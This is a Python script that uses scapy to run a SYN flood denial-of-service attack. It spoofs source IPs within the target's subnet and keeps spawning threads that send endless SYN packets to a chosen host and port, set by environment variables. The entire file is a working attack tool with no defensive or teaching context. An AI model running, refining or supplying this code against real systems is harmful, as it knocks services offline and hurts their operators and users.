import random
import threading
import time
import os
from scapy.all import IP, TCP, send

class SYNFlood:
    def __init__(self, target, port, base_fake_ip):
        self.target = target
        self.port = port
        self.base_fake_ip = base_fake_ip

    def generate_fake_ip(self):
        ip_parts = self.base_fake_ip.split('.')
        ip_parts[-1] = str(random.randint(1, 254))
        return '.'.join(ip_parts)

    def send_syn_packet(self, fake_ip):
        ip = IP(src=fake_ip, dst=self.target)
        tcp = TCP(dport=self.port, sport=random.randint(1024, 65535), flags="S")
        packet = ip / tcp
        send(packet, verbose=0)
        print(f"SYN fake IP: {fake_ip}")

    def attack(self):
        while True:
            fake_ip = self.generate_fake_ip()
            self.send_syn_packet(fake_ip)
            time.sleep(0.01)

    def start_attack(self, threads=5, delay=0.005):
        for _ in range(threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()
            time.sleep(delay)

if __name__ == "__main__":
    target_ip = os.environ.get('TARGET_IP', '192.168.2.22')
    port = int(os.environ.get('PORT', 80))
    threads = int(os.environ.get('THREADS', 10))
    
    # Extract base IP from target
    ip_parts = target_ip.split('.')
    base_fake_ip = '.'.join(ip_parts[:3]) + '.'

    syn_flood = SYNFlood(target_ip, port, base_fake_ip)
    try:
        while True:
            syn_flood.start_attack(threads=threads, delay=0.001)
    except KeyboardInterrupt:
        print("\nAttack stopped.")
